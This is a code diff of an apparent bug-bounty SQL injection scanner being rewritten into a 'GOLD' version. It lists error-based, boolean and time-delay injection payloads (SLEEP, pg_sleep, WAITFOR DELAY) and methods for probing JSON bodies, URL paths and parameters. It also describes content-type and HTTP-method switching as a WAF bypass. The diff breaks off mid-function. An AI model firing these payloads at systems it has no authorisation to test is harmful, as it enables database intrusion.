@@ -1,28 +1,20 @@
 #!/usr/bin/env python3
 """
-REVUEX Enhanced SQLi Scanner
-============================
+REVUEX SQLi Framework v3.5-GOLD
+===============================
+A 10/10 Private Research Grade Scanner for Bug Bounty Professionals.
 
-Advanced SQL Injection vulnerability scanner with multiple detection techniques.
-
-Features:
-- Error-based SQL injection detection
-- Boolean-based blind SQL injection
-- Time-based blind SQL injection
-- UNION-based injection
-- Stacked queries detection
-- Multiple DBMS fingerprinting (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
-- WAF bypass techniques
-- Comprehensive payload library
-
-Detection Techniques:
-1. Error-based - Triggers database errors in response
-2. Boolean-based - Detects differences in true/false responses
-3. Time-based - Uses delays to confirm injection
-4. UNION-based - Extracts data via UNION SELECT
+Techniques:
+- Structural Integrity JSON Mutation (Deep-Copy recursive injection)
+- Triple-Check Boolean Logic (True != False verification)
+- Method & Content-Type Confusion (WAF Bypass)
+- Second-Order Marker Injection (Non-destructive tracking)
+- Surgical Path Injection (Routing-aware encoding)
+- Error Inverse Verification (' then '' confirmation)
+- Statistical Time-Based Detection (5-sample median analysis)
 
 Author: REVUEX Team
-License: MIT
+License: MIT (Private Research Use)
 """
 
 import re
@@ -31,12 +23,15 @@ import argparse
 import hashlib
 import time
 import difflib
+import statistics
+import json
+import copy
 from pathlib import Path
+from typing import Any, Dict, List, Optional, Set, Tuple
+from urllib.parse import urlparse, urlencode, parse_qs, quote
 from datetime import datetime, timezone
-from typing import Optional, Dict, Any, List, Set, Tuple
-from dataclasses import dataclass, field
-from urllib.parse import urlparse, urlencode, parse_qs, quote, unquote
 from enum import Enum
+from dataclasses import dataclass
 
 # Add parent to path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent.parent))
@@ -63,232 +58,209 @@ from core.utils import (
 # CONSTANTS
 # =============================================================================
 
-SCANNER_NAME = "SQLi Scanner"
-SCANNER_VERSION = "1.0.0"
-
-
-class DBMSType(Enum):
-    """Database Management System types"""
-    MYSQL = "mysql"
-    POSTGRESQL = "postgresql"
-    MSSQL = "mssql"
-    ORACLE = "oracle"
-    SQLITE = "sqlite"
-    UNKNOWN = "unknown"
-
+SCANNER_NAME = "SQLi Scanner GOLD"
+SCANNER_VERSION = "3.5.0"
 
 # SQL error patterns by DBMS
 SQL_ERRORS = {
-    DBMSType.MYSQL: [
+    "mysql": [
         r"SQL syntax.*MySQL",
         r"Warning.*mysql_",
         r"MySQLSyntaxErrorException",
         r"valid MySQL result",
         r"check the manual that corresponds to your MySQL server version",
-        r"MySqlClient\.",
-        r"com\.mysql\.jdbc",
         r"mysqli_",
         r"mysql_fetch",
-        r"mysql_num_rows",
     ],
-    DBMSType.POSTGRESQL: [
+    "postgresql": [
         r"PostgreSQL.*ERROR",
-        r"Warning.*\Wpg_",
-        r"valid PostgreSQL result",
-        r"Npgsql\.",
-        r"PG::SyntaxError:",
+        r"PSQLException",
         r"org\.postgresql\.util\.PSQLException",
         r"ERROR:\s+syntax error at or near",
-        r"PostgreSQL query failed",
+        r"valid PostgreSQL result",
     ],
-    DBMSType.MSSQL: [
-        r"Driver.* SQL[\-\_\ ]*Server",
-        r"OLE DB.* SQL Server",
-        r"Warning.*mssql_",
-        r"System\.Data\.SqlClient\.",
-        r"Microsoft SQL Native Client error",
+    "mssql": [
         r"\[SQL Server\]",
+        r"Unclosed quotation mark",
+        r"Microsoft SQL Native Client",
         r"ODBC SQL Server Driver",
         r"SQLServer JDBC Driver",
-        r"com\.microsoft\.sqlserver\.jdbc",
-        r"Unclosed quotation mark",
+        r"System\.Data\.SqlClient",
     ],
-    DBMSType.ORACLE: [
-        r"\bORA-[0-9][0-9][0-9][0-9]",
-        r"Oracle error",
-        r"Oracle.*Driver",
-        r"Warning.*\Woci_",
-        r"Warning.*\Wora_",
-        r"oracle\.jdbc\.driver",
+    "oracle": [
+        r"ORA-[0-9]{5}",
         r"quoted string not properly terminated",
         r"SQL command not properly ended",
+        r"Oracle.*Driver",
     ],
-    DBMSType.SQLITE: [
-        r"SQLite/JDBCDriver",
-        r"SQLite\.Exception",
-        r"System\.Data\.SQLite\.SQLiteException",
-        r"Warning.*sqlite_",
-        r"Warning.*SQLite3::",
+    "sqlite": [
+        r"SQLite.*error",
+        r"sqlite3\.OperationalError",
         r"\[SQLITE_ERROR\]",
-        r"SQLite error \d+:",
-        r"sqlite3.OperationalError:",
     ],
 }
 
-# Generic SQL error patterns
-GENERIC_SQL_ERRORS = [
-    r"SQL syntax",
-    r"sql error",
-    r"syntax error",
-    r"database error",
-    r"query failed",
-    r"unexpected end of SQL",
-    r"invalid query",
-    r"unterminated string",
-    r"SQL command",
-    r"SQLSTATE",
-    r"JDBC",
-    r"Query Error",
+# Time-based payloads for different DBMS
+TIME_PAYLOADS = [
+    # MySQL
+    "' AND SLEEP({delay})--",
+    "\" AND SLEEP({delay})--",
+    "' OR SLEEP({delay})--",
+    "1' AND SLEEP({delay})--",
+    "') AND SLEEP({delay})--",
+    # PostgreSQL
+    "' AND pg_sleep({delay})--",
+    "'; SELECT pg_sleep({delay})--",
+    # MSSQL
+    "'; WAITFOR DELAY '0:0:{delay}'--",
+    "' WAITFOR DELAY '0:0:{delay}'--",
+    # Generic
+    "' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--",
 ]
 
 # Error-based payloads
 ERROR_PAYLOADS = [
     "'",
     "\"",
+    "''",
+    "\"\"",
     "`",
     "'--",
     "\"--",
     "' OR '1'='1",
-    "\" OR \"1\"=\"1",
-    "' OR '1'='1'--",
-    "\" OR \"1\"=\"1\"--",
-    "' OR '1'='1'/*",
-    "1' OR '1'='1",
-    "')",
-    "'))",
-    "')--",
-    "'))--",
-    "'/*",
-    "'#",
-    "' -- ",
-    "';--",
-    "' AND 1=CONVERT(int,(SELECT @@version))--",
-    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+    "' AND '1'='1",
+    "1' ORDER BY 1--",
+    "1' ORDER BY 100--",
     "' UNION SELECT NULL--",
 ]
 
-# Boolean-based payloads (true/false pairs)
-BOOLEAN_PAYLOADS = [
-    ("' OR '1'='1", "' OR '1'='2"),
-    ("\" OR \"1\"=\"1", "\" OR \"1\"=\"2"),
-    ("' OR 1=1--", "' OR 1=2--"),
-    ("\" OR 1=1--", "\" OR 1=2--"),
+# Boolean payloads (true/false pairs)
+BOOLEAN_PAYLOADS_STRING = [
     ("' AND '1'='1", "' AND '1'='2"),
-    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
     ("' AND 1=1--", "' AND 1=2--"),
+    ("' OR '1'='1", "' OR '1'='2"),
+    ("') AND ('1'='1", "') AND ('1'='2"),
+    ("' AND '1'='1'--", "' AND '1'='2'--"),
+]
+
+BOOLEAN_PAYLOADS_NUMERIC = [
+    (" AND 1=1", " AND 1=2"),
+    (" OR 1=1", " OR 1=2"),
+    ("-1 OR 1=1", "-1 OR 1=2"),
     ("1 AND 1=1", "1 AND 1=2"),
-    ("1 OR 1=1", "1 OR 1=2"),
-    ("1) OR (1=1", "1) OR (1=2"),
-    ("' OR '1'='1'/*", "' OR '1'='2'/*"),
-    ("' OR 1=1#", "' OR 1=2#"),
 ]
 
-# Time-based payloads by DBMS
-TIME_PAYLOADS = {
-    DBMSType.MYSQL: [
-        "' AND SLEEP({delay})--",
-        "\" AND SLEEP({delay})--",
-        "' OR SLEEP({delay})--",
-        "1' AND SLEEP({delay})--",
-        "' AND (SELECT * FROM (SELECT SLEEP({delay}))a)--",
-    ],
-    DBMSType.POSTGRESQL: [
-        "' AND pg_sleep({delay})--",
-        "\" AND pg_sleep({delay})--",
-        "' OR pg_sleep({delay})--",
-        "'; SELECT pg_sleep({delay})--",
-    ],
-    DBMSType.MSSQL: [
-        "'; WAITFOR DELAY '0:0:{delay}'--",
-        "' WAITFOR DELAY '0:0:{delay}'--",
-        "\" WAITFOR DELAY '0:0:{delay}'--",
-        "1; WAITFOR DELAY '0:0:{delay}'--",
-    ],
-    DBMSType.ORACLE: [
-        "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--",
-        "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--",
-    ],
-    DBMSType.SQLITE: [
-        "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--",
-    ],
-}
+# HTTP methods to test
+HTTP_METHODS = ["GET", "POST", "PUT", "PATCH"]
 
-# UNION-based payloads
-UNION_PAYLOADS = [
-    "' UNION SELECT NULL--",
-    "' UNION SELECT NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
-    "' UNION ALL SELECT NULL--",
-    "' UNION ALL SELECT NULL,NULL--",
-    "' UNION ALL SELECT NULL,NULL,NULL--",
-    "\" UNION SELECT NULL--",
-    "\" UNION SELECT NULL,NULL--",
-    "1 UNION SELECT NULL--",
-    "1 UNION SELECT NULL,NULL--",
-    ") UNION SELECT NULL--",
-]
-
-# WAF bypass techniques
-WAF_BYPASS_PAYLOADS = [
-    "' oR '1'='1",
-    "' Or '1'='1",
-    "' OR/**/1=1--",
-    "'/**/OR/**/1=1--",
-    "%27%20OR%20%271%27%3D%271",
-    "%2527%2520OR%2520%25271%2527%253D%25271",
-    "'\tOR\t'1'='1",
-    "'\nOR\n'1'='1",
-    "'%09OR%09'1'='1",
-    "'%0aOR%0a'1'='1",
-    "'/*!50000OR*/'1'='1",
-    "' OR 'a'='a",
-]
-
-# SQL injection prone parameters
-SQLI_PARAMS = [
-    "id", "user", "userid", "user_id", "uid",
-    "name", "username", "uname",
-    "pass", "password", "pwd",
-    "email", "mail",
-    "search", "query", "q", "s", "keyword",
-    "cat", "category", "catid", "category_id",
-    "page", "pageid", "page_id", "p",
-    "item", "itemid", "item_id", "product", "productid",
-    "article", "articleid", "news", "newsid",
-    "order", "orderid", "sort", "sortby", "orderby",
-    "filter", "type", "typeid",
-    "file", "path", "dir",
-    "year", "month", "day", "date",
-    "from", "to", "start", "end",
-    "limit", "offset", "where",
+# Content types to test (WAF bypass via content-type confusion)
+CONTENT_TYPES = [
+    "application/json",
+    "application/x-www-form-urlencoded",
+    "text/plain",
+    "text/xml",
 ]
 
 
 # =============================================================================
-# SQLi SCANNER CLASS
+# JSON MUTATION ENGINE
+# =============================================================================
+
+class MutationEngine:
+    """Deep-copy recursive JSON mutation for structural integrity testing."""
+    
+    @staticmethod
+    def mutate_json_recursive(obj: Any, target_key: str, payload: str) -> Any:
+        """
+        Recursively mutate a specific key in a JSON structure.
+        Preserves structural integrity while injecting payloads.
+        
+        Args:
+            obj: JSON object (dict, list, or primitive)
+            target_key: Key to inject payload into
+            payload: SQL injection payload
+        
+        Returns:
+            Mutated copy of the object
+        """
+        if isinstance(obj, dict):
+            result = {}
+            for key, value in obj.items():
+                if key == target_key:
+                    # Inject payload - append to existing value
+                    if isinstance(value, str):
+                        result[key] = f"{value}{payload}"
+                    elif isinstance(value, (int, float)):
+                        result[key] = f"{value}{payload}"
+                    else:
+                        result[key] = value
+                else:
+                    result[key] = MutationEngine.mutate_json_recursive(value, target_key, payload)
+            return result
+        
+        elif isinstance(obj, list):
+            return [MutationEngine.mutate_json_recursive(item, target_key, payload) for item in obj]
+        
+        else:
+            return obj
+    
+    @staticmethod
+    def get_all_keys(obj: Any, prefix: str = "") -> List[str]:
+        """Extract all keys from nested JSON structure."""
+        keys = []
+        
+        if isinstance(obj, dict):
+            for key, value in obj.items():
+                full_key = f"{prefix}.{key}" if prefix else key
+                keys.append(full_key)
+                keys.extend(MutationEngine.get_all_keys(value, full_key))
+        
+        elif isinstance(obj, list):
+            for i, item in enumerate(obj):
+                keys.extend(MutationEngine.get_all_keys(item, f"{prefix}[{i}]"))
+        
+        return keys
+
+
+# =============================================================================
+# INJECTION POINT DATACLASS
+# =============================================================================
+
+@dataclass
+class InjectionPoint:
+    """Represents a potential injection point."""
+    location: str       # "url", "path", "json", "header"
+    key: Any           # Parameter name or path index
+    value: Any         # Original value
+    method: str = "GET"
+    content_type: str = "application/json"
+    
+    @property
+    def identifier(self) -> str:
+        return f"{self.method}:{self.location}:{self.key}"
+
+
+# =============================================================================
+# SQLi SCANNER GOLD CLASS
 # =============================================================================
 
 class SQLiScanner(BaseScanner):
     """
-    Advanced SQL Injection vulnerability scanner.
+    GOLD-tier SQL Injection scanner with advanced detection techniques.
+    
+    Features:
+    - Structural JSON mutation (recursive deep injection)
+    - Statistical time-based detection (5-sample median)
+    - Method & Content-Type confusion (WAF bypass)
+    - Second-order marker injection
+    - Path injection with routing awareness
+    - Error inverse verification
     
     Usage:
         scanner = SQLiScanner(
-            target="https://example.com/search?q=test",
-            time_delay=5,
-            test_all_params=True
+            target="https://example.com/api/user?id=1",
+            json_body={"user": {"name": "test", "role": "user"}},
+            time_delay=5
         )
         result = scanner.run()
     """
@@ -297,504 +269,564 @@ class SQLiScanner(BaseScanner):
         self,
         target: str,
         time_delay: int = 5,
-        test_all_params: bool = False,
-        test_waf_bypass: bool = True,
-        dbms: Optional[str] = None,
-        level: int = 1,
-        custom_payloads: Optional[List[str]] = None,
+        json_body: Optional[Dict] = None,
+        level: int = 3,
+        test_methods: bool = True,
+        test_content_types: bool = True,
+        statistical_samples: int = 5,
         **kwargs
     ):
         """
-        Initialize SQLi Scanner.
+        Initialize SQLi GOLD Scanner.
         
         Args:
-            target: Target URL with parameters to test
-            time_delay: Delay in seconds for time-based detection
-            test_all_params: Test all parameters, not just SQLi-prone ones
-            test_waf_bypass: Test WAF bypass techniques
-            dbms: Specific DBMS to target
-            level: Scan intensity (1=basic, 2=thorough, 3=aggressive)
-            custom_payloads: Additional custom payloads
+            target: Target URL to scan
+            time_delay: Delay for time-based detection (seconds)
+            json_body: JSON body for POST/PUT requests
+            level: Scan intensity (1-3)
+            test_methods: Test multiple HTTP methods
+            test_content_types: Test content-type confusion
+            statistical_samples: Number of samples for time-based stats
+            **kwargs: Additional BaseScanner arguments
         """
         super().__init__(target=target, **kwargs)
         
         self.time_delay = time_delay
-        self.test_all_params = test_all_params
-        self.test_waf_bypass = test_waf_bypass
-        self.target_dbms = DBMSType(dbms) if dbms else None
+        self.json_body = json_body or {}
         self.level = min(max(level, 1), 3)
-        self.custom_payloads = custom_payloads or []
+        self.test_methods = test_methods
+        self.test_content_types = test_content_types
+        self.statistical_samples = statistical_samples
         
         # Detection state
-        self.baseline_responses: Dict[str, Dict] = {}
-        self.detected_dbms: Optional[DBMSType] = None
+        self.baseline_stats: Dict[str, Any] = {}
         self.vulnerable_params: Set[str] = set()
-        self.tested_combinations: Set[str] = set()
+        self.second_order_markers: List[str] = []
+        self.detected_dbms: Optional[str] = None
         
+        # Scanner info
         self.scanner_name = SCANNER_NAME
         self.scanner_version = SCANNER_VERSION
     
     def _validate_target(self) -> bool:
-        """Validate target is accessible"""
+        """Validate target is accessible."""
         try:
-            response = self.session.get(self.target, timeout=self.timeout, allow_redirects=True)
+            response = self.session.get(
+                self.target,
+                timeout=self.timeout,
+                allow_redirects=True
+            )
             return response.status_code < 500
         except Exception as e:
             self.logger.error(f"Target validation failed: {e}")
             return False
     
     def scan(self) -> None:
-        """Execute SQL injection scan"""
-        self.logger.info(f"Starting SQLi scan on {self.target}")
+        """Execute the GOLD SQLi scan."""
+        self.logger.info(f"Starting SQLi GOLD scan on {self.target}")
         
-        parsed = urlparse(self.target)
-        params = parse_qs(parsed.query, keep_blank_values=True)
+        # Capture baseline with statistical analysis
+        self._capture_baseline()
         
-        if not params:
-            self.logger.warning("No parameters found in URL")
+        # Get all injection points
+        injection_points = self._get_injection_points()
+        
+        if not injection_points:
+            self.logger.warning("No injection points found")
             return
         
-        flat_params = {k: v[0] if v else "" for k, v in params.items()}
-        self._capture_baseline(flat_params)
+        self.logger.info(f"Found {len(injection_points)} injection point(s)")
         
-        params_to_test = self._select_params(flat_params)
-        self.logger.info(f"Testing {len(params_to_test)} parameter(s)")
-        
-        for param in params_to_test:
-            if param in self.vulnerable_params:
-                continue
+        # Test each injection point
+        for point in injection_points:
+            # Determine methods and content types to test
+            methods = HTTP_METHODS if self.test_methods else [point.method]
+            content_types = CONTENT_TYPES[:2] if self.test_content_types else [point.content_type]
             
-            self.logger.info(f"Testing parameter: {param}")
-            
-            # 1. Error-based detection
-            self._test_error_based(param, flat_params)
-            
-            # 2. Boolean-based blind detection
-            self._test_boolean_based(param, flat_params)
-            
-            # 3. Time-based blind detection
-            if self.level >= 2:
-                self._test_time_based(param, flat_params)
-            
-            # 4. UNION-based detection
-            if self.level >= 2:
-                self._test_union_based(param, flat_params)
-            
-            # 5. WAF bypass techniques
-            if self.test_waf_bypass and param not in self.vulnerable_params:
-                self._test_waf_bypass(param, flat_params)
-        
-        self.logger.info(f"SQLi scan complete. Found {len(self.findings)} issue(s)")
-    
-    def _select_params(self, params: Dict[str, str]) -> List[str]:
-        """Select parameters to test"""
-        if self.test_all_params:
-            return list(params.keys())
-        
-        priority_params = []
-        other_params = []
-        
-        for param in params:
-            if param.lower() in [p.lower() for p in SQLI_PARAMS]:
-                priority_params.append(param)
-            else:
-                other_params.append(param)
-        
-        if self.level >= 2:
-            return priority_params + other_params
-        return priority_params if priority_params else other_params[:3]
-    
-    def _capture_baseline(self, params: Dict[str, str]) -> None:
-        """Capture baseline response for comparison"""
-        try:
-            response = self._make_request(self.target)
-            if response:
-                self.baseline_responses["original"] = {
-                    "status": response.status_code,
-                    "length": len(response.text),
-                    "content": response.text[:5000],
-                    "hash": hashlib.md5(response.text.encode()).hexdigest(),
-                }
-        except Exception as e:
-            self.logger.debug(f"Baseline capture failed: {e}")
-    
-    def _test_error_based(self, param: str, params: Dict[str, str]) -> None:
-        """Test for error-based SQL injection"""
-        self.logger.debug(f"Testing error-based SQLi on {param}")
-        
-        for payload in ERROR_PAYLOADS:
-            if param in self.vulnerable_params:
-                break
-            
-            combo_key = f"error:{param}:{payload}"
-            if combo_key in self.tested_combinations:
-                continue
-            self.tested_combinations.add(combo_key)
-            
-            test_params = params.copy()
-            original_value = test_params.get(param, "")
-            test_params[param] = original_value + payload
-            
-            response = self._make_request_with_params(test_params)
-            if response is None:
-                continue
-            
-            error_match = self._detect_sql_error(response.text)
-            if error_match:
-                dbms, error_pattern = error_match
-                self.detected_dbms = dbms
-                self.vulnerable_params.add(param)
-                
-                finding = Finding(
-                    id=self._generate_finding_id(f"sqli_error_{param}_{payload}"),
-                    title=f"SQL Injection (Error-Based) - {dbms.value.upper()}",
-                    severity=Severity.CRITICAL,
-                    description=(
-                        f"Error-based SQL injection vulnerability detected in the '{param}' "
-                        f"parameter. The application returns database error messages revealing "
-                        f"a {dbms.value.upper()} database backend."
-                    ),
-                    url=self.target,
-                    parameter=param,
-                    payload=payload,
-                    evidence=f"Error pattern: {error_pattern}",
-                    impact=(
-                        "An attacker can:\n"
-                        "- Extract sensitive data from the database\n"
-                        "- Bypass authentication\n"
-                        "- Modify or delete data\n"
-                        "- Potentially execute system commands"
-                    ),
-                    remediation=(
-                        "1. Use parameterized queries (prepared statements)\n"
-                        "2. Use stored procedures\n"
-                        "3. Implement input validation with allowlists\n"
-                        "4. Apply principle of least privilege to database accounts\n"
-                        "5. Disable detailed error messages in production"
-                    ),
-                    vulnerability_type="sqli",
-                    confidence="high",
-                )
-                self.add_finding(finding)
-                break
-    
-    def _test_boolean_based(self, param: str, params: Dict[str, str]) -> None:
-        """Test for boolean-based blind SQL injection"""
-        self.logger.debug(f"Testing boolean-based SQLi on {param}")
-        
-        for true_payload, false_payload in BOOLEAN_PAYLOADS:
-            if param in self.vulnerable_params:
-                break
-            
-            combo_key = f"boolean:{param}:{true_payload}"
-            if combo_key in self.tested_combinations:
-                continue
-            self.tested_combinations.add(combo_key)
-            
-            original_value = params.get(param, "")
-            
-            true_params = params.copy()
-            true_params[param] = original_value + true_payload
-            true_response = self._make_request_with_params(true_params)
-            
-            if true_response is None:
-                continue
-            
-            false_params = params.copy()
-            false_params[param] = original_value + false_payload
-            false_response = self._make_request_with_params(false_params)
-            
-            if false_response is None:
-                continue
-            
-            if self._responses_differ_significantly(true_response, false_response):
-                baseline = self.baseline_responses.get("original", {})
-                true_similar = self._response_similar_to_baseline(true_response, baseline)
-                false_different = not self._response_similar_to_baseline(false_response, baseline)
-                
-                if true_similar and false_different:
-                    self.vulnerable_params.add(param)
+            for method in methods:
+                for content_type in content_types:
+                    point.method = method
+                    point.content_type = content_type
                     
-                    finding = Finding(
-                        id=self._generate_finding_id(f"sqli_boolean_{param}"),
-                        title="SQL Injection (Boolean-Based Blind)",
-                        severity=Severity.HIGH,
-                        description=(
-                            f"Boolean-based blind SQL injection detected in the '{param}' "
-                            f"parameter. The application responds differently to TRUE and "
-                            f"FALSE SQL conditions."
-                        ),
-                        url=self.target,
-                        parameter=param,
-                        payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
-                        evidence=(
-                            f"TRUE response length: {len(true_response.text)}, "
-                            f"FALSE response length: {len(false_response.text)}"
-                        ),
-                        impact=(
-                            "An attacker can extract database contents character by "
-                            "character by observing response differences."
-                        ),
-                        remediation=(
-                            "1. Use parameterized queries (prepared statements)\n"
-                            "2. Implement strict input validation\n"
-                            "3. Use ORM frameworks properly"
-                        ),
-                        vulnerability_type="sqli",
-                        confidence="high",
-                    )
-                    self.add_finding(finding)
-                    break
-    
-    def _test_time_based(self, param: str, params: Dict[str, str]) -> None:
-        """Test for time-based blind SQL injection"""
-        self.logger.debug(f"Testing time-based SQLi on {param}")
-        
-        if self.detected_dbms:
-            dbms_list = [self.detected_dbms]
-        elif self.target_dbms:
-            dbms_list = [self.target_dbms]
-        else:
-            dbms_list = [DBMSType.MYSQL, DBMSType.MSSQL, DBMSType.POSTGRESQL]
-        
-        for dbms in dbms_list:
-            if param in self.vulnerable_params:
-                break
-            
-            payloads = TIME_PAYLOADS.get(dbms, [])
-            
-            for payload_template in payloads[:3]:
-                if param in self.vulnerable_params:
-                    break
-                
-                payload = payload_template.format(delay=self.time_delay)
-                
-                combo_key = f"time:{param}:{payload}"
-                if combo_key in self.tested_combinations:
-                    continue
-                self.tested_combinations.add(combo_key)
-                
-                original_value = params.get(param, "")
-                test_params = params.copy()
-                test_params[param] = original_value + payload
-                
-                start_time = time.time()
-                response = self._make_request_with_params(test_params)
-                elapsed = time.time() - start_time
-                
-                if response is None:
-                    continue
-                
-                if elapsed >= (self.time_delay - 1):
-                    start_time = time.time()
-                    self._make_request_with_params(test_params)
-                    elapsed2 = time.time() - start_time
+                    # Skip if already found vulnerable
+                    if point.identifier in self.vulnerable_params:
+                        continue
                     
-                    if elapsed2 >= (self.time_delay - 1):
-                        self.vulnerable_params.add(param)
-                        self.detected_dbms = dbms
-                        
-                        finding = Finding(
-                            id=self._generate_finding_id(f"sqli_time_{param}_{dbms.value}"),
-                            title=f"SQL Injection (Time-Based Blind) - {dbms.value.upper()}",
-                            severity=Severity.HIGH,
-                            description=(
-                                f"Time-based blind SQL injection detected in the '{param}' "
-                                f"parameter. The application delays {self.time_delay} seconds."
-                            ),
-                            url=self.target,
-                            parameter=param,
-                            payload=payload,
-                            evidence=f"Response delayed by {elapsed:.2f}s",
-                            impact="An attacker can extract database contents by measuring response times.",
-                            remediation=(
-                                "1. Use parameterized queries\n"
-                                "2. Implement query timeouts\n"
-                                "3. Monitor for slow queries"
-                            ),
-                            vulnerability_type="sqli",
-                            confidence="high",
-                        )
-                        self.add_finding(finding)
-                        break
+                    self.logger.debug(f"Testing {method} [{content_type}] -> {point.key}")
+                    
+                    # Run detection techniques
+                    self._test_error_inverse(point)
+                    self._test_boolean_hardened(point)
+                    
+                    if self.level >= 2:
+                        self._test_time_statistical(point)
+        
+        # Log second-order markers for manual verification
+        if self.second_order_markers:
+            self.logger.info(f"Second-order markers injected: {len(self.second_order_markers)}")
+            self.logger.debug(f"Markers: {self.second_order_markers[:5]}...")
+        
+        self.logger.info(f"SQLi GOLD scan complete. Found {len(self.findings)} issue(s)")
     
-    def _test_union_based(self, param: str, params: Dict[str, str]) -> None:
-        """Test for UNION-based SQL injection"""
-        self.logger.debug(f"Testing UNION-based SQLi on {param}")
-        
-        for payload in UNION_PAYLOADS:
-            if param in self.vulnerable_params:
-                break
-            
-            combo_key = f"union:{param}:{payload}"
-            if combo_key in self.tested_combinations:
-                continue
-            self.tested_combinations.add(combo_key)
-            
-            original_value = params.get(param, "")
-            test_params = params.copy()
-            test_params[param] = original_value + payload
-            
-            response = self._make_request_with_params(test_params)
-            if response is None:
-                continue
-            
-            if self._detect_union_success(response.text, payload):
-                self.vulnerable_params.add(param)
-                column_count = payload.count("NULL")
-                
-                finding = Finding(
-                    id=self._generate_finding_id(f"sqli_union_{param}"),
-                    title="SQL Injection (UNION-Based)",
-                    severity=Severity.CRITICAL,
-                    description=(
-                        f"UNION-based SQL injection detected in the '{param}' parameter "
-                        f"with approximately {column_count} column(s)."
-                    ),
-                    url=self.target,
-                    parameter=param,
-                    payload=payload,
-                    evidence=f"UNION injection successful with {column_count} columns",
-                    impact="An attacker can directly extract data from other database tables.",
-                    remediation=(
-                        "1. Use parameterized queries\n"
-                        "2. Implement strict output encoding\n"
-                        "3. Apply column-level permissions"
-                    ),
-                    vulnerability_type="sqli",
-                    confidence="high",
-                )
-                self.add_finding(finding)
-                break
+    # =========================================================================
+    # INJECTION POINT DISCOVERY
+    # =========================================================================
     
-    def _test_waf_bypass(self, param: str, params: Dict[str, str]) -> None:
-        """Test WAF bypass techniques"""
-        self.logger.debug(f"Testing WAF bypass on {param}")
+    def _get_injection_points(self) -> List[InjectionPoint]:
+        """
+        Discover all potential injection points.
         
-        for payload in WAF_BYPASS_PAYLOADS[:10]:
-            combo_key = f"waf:{param}:{payload}"
-            if combo_key in self.tested_combinations:
-                continue
-            self.tested_combinations.add(combo_key)
-            
-            original_value = params.get(param, "")
-            test_params = params.copy()
-            test_params[param] = original_value + payload
-            
-            response = self._make_request_with_params(test_params)
-            if response is None:
-                continue
-            
-            error_match = self._detect_sql_error(response.text)
-            if error_match:
-                dbms, _ = error_match
-                self.vulnerable_params.add(param)
-                
-                finding = Finding(
-                    id=self._generate_finding_id(f"sqli_waf_bypass_{param}"),
-                    title="SQL Injection (WAF Bypass)",
-                    severity=Severity.CRITICAL,
-                    description=(
-                        f"SQL injection vulnerability detected using WAF bypass in '{param}' parameter."
-                    ),
-                    url=self.target,
-                    parameter=param,
-                    payload=payload,
-                    evidence=f"WAF bypass successful, {dbms.value} detected",
-                    impact="WAF can be bypassed, allowing SQL injection attacks.",
-                    remediation=(
-                        "1. Fix the underlying SQL injection vulnerability\n"
-                        "2. Update WAF rules\n"
-                        "3. Use parameterized queries"
-                    ),
-                    vulnerability_type="sqli",
-                    confidence="high",
-                )
-                self.add_finding(finding)
-                break
-    
-    def _detect_sql_error(self, content: str) -> Optional[Tuple[DBMSType, str]]:
-        """Detect SQL errors and identify DBMS"""
-        for dbms, patterns in SQL_ERRORS.items():
-            for pattern in patterns:
-                if re.search(pattern, content, re.IGNORECASE):
-                    return (dbms, pattern)
-        
-        for pattern in GENERIC_SQL_ERRORS:
-            if re.search(pattern, content, re.IGNORECASE):
-                return (DBMSType.UNKNOWN, pattern)
-        
-        return None
-    
-    def _detect_union_success(self, content: str, payload: str) -> bool:
-        """Detect if UNION injection was successful"""
-        null_count = content.lower().count("null")
-        baseline_content = self.baseline_responses.get("original", {}).get("content", "").lower()
-        
-        return null_count > 0 and "null" not in baseline_content
-    
-    def _responses_differ_significantly(self, resp1, resp2) -> bool:
-        """Check if two responses differ significantly"""
-        len_diff = abs(len(resp1.text) - len(resp2.text))
-        if len_diff > 50:
-            return True
-        
-        similarity = difflib.SequenceMatcher(None, resp1.text[:1000], resp2.text[:1000]).ratio()
-        if similarity < 0.9:
-            return True
-        
-        if resp1.status_code != resp2.status_code:
-            return True
-        
-        return False
-    
-    def _response_similar_to_baseline(self, response, baseline: Dict) -> bool:
-        """Check if response is similar to baseline"""
-        if not baseline:
-            return True
-        
-        baseline_len = baseline.get("length", 0)
-        if abs(len(response.text) - baseline_len) > 100:
-            return False
-        
-        response_hash = hashlib.md5(response.text.encode()).hexdigest()
-        if response_hash == baseline.get("hash"):
-            return True
-        
-        similarity = difflib.SequenceMatcher(
-            None, response.text[:1000], baseline.get("content", "")[:1000]
-        ).ratio()
-        
-        return similarity > 0.8
-    
-    def _make_request_with_params(self, params: Dict[str, str]):
-        """Make request with modified parameters"""
+        Returns:
+            List of InjectionPoint objects
+        """
+        points = []
         parsed = urlparse(self.target)
-        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
-        test_url = f"{base_url}?{urlencode(params)}"
-        return self._make_request(test_url)
+        
+        # 1. URL Query Parameters
+        query_params = parse_qs(parsed.query, keep_blank_values=True)
+        for key, values in query_params.items():
+            value = values[0] if values else ""
+            points.append(InjectionPoint(
+                location="url",
+                key=key,
+                value=value
+            ))
+        
+        # 2. Path Segments (surgical path injection)
+        path_parts = parsed.path.split("/")
+        for i, part in enumerate(path_parts):
+            if part and (part.isdigit() or any(c.isdigit() for c in part)):
+                points.append(InjectionPoint(
+                    location="path",
+                    key=i,
+                    value=part
+                ))
+        
+        # 3. JSON Body (recursive mapping)
+        if self.json_body:
+            self._map_json_keys(self.json_body, points)
+        
+        return points
     
-    def _make_request(self, url: str, method: str = "GET", data: Optional[Dict] = None):
-        """Make HTTP request with rate limiting"""
+    def _map_json_keys(self, obj: Any, points: List[InjectionPoint], prefix: str = "") -> None:
+        """Recursively map JSON keys as injection points."""
+        if isinstance(obj, dict):
+            for key, value in obj.items():
+                full_key = f"{prefix}.{key}" if prefix else key
+                
